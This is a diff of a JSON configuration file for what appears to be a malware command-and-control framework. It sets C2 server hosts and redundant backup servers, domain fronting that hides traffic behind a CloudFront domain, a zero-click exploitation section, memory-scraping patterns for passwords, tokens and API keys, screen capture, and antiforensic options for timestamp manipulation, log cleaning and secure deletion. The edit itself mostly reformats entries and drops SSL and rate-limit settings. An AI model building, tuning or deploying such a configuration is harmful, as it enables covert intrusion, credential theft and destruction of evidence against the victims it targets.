@@ -11,19 +11,13 @@
   },
   "c2": {
     "host": "0.0.0.0",
-    "port": 5001,
-    "ssl_cert": "certs/server.crt",
-    "ssl_key": "certs/server.key",
+    "port": 5000,
     "domain_fronting": {
       "enabled": true,
       "cdn_domain": "d111111abcdef8.cloudfront.net",
       "backend_domain": "api.wormgpt.live"
     },
-    "redundancy": [
-      "https://c2-server-1.net",
-      "https://c2-server-2.net"
-    ],
-    "http_port": 8081
+    "redundancy": ["https://c2-server-1.net", "https://c2-server-2.net"]
   },
   "exploitation": {
     "zero_click": {
@@ -59,20 +53,12 @@
   },
   "data_collection": {
     "sensor_refresh_rate_ms": 1000,
-    "memory_scraper_patterns": [
-      "password",
-      "token",
-      "api_key"
-    ],
+    "memory_scraper_patterns": ["password", "token", "api_key"],
     "screen_capture_quality": 85
   },
   "antiforensics": {
     "timestamp_manipulation": true,
     "log_cleaning": true,
     "secure_delete": true
-  },
-  "rate_limiting": {
-    "storage_uri": "redis://localhost:6379",
-    "default_limits": "200 per day, 50 per hour"
   }
 }
